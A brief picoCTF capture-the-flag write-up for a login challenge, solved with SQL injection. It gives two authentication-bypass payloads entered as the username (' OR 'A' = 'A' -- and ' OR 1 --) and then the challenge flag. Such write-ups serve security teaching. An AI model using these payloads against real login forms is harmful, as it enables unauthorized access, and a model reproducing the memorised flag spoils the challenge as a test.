## Question

There is a website running at https://jupiter.challenges.picoctf.org/problem/50009/ ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Hint

There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?

Try to think about how does the website verify your login?

## Solution

This is a SQL injection vuln. So, I've tried a basic SQL injection bypass

```bash
Username:       ' OR 'A' = 'A' --
or another one: ' OR 1 --
```

Then click to Login buttom to see the flag

## Flag

`picoCTF{s0m3_SQL_fb3fe2ad}`
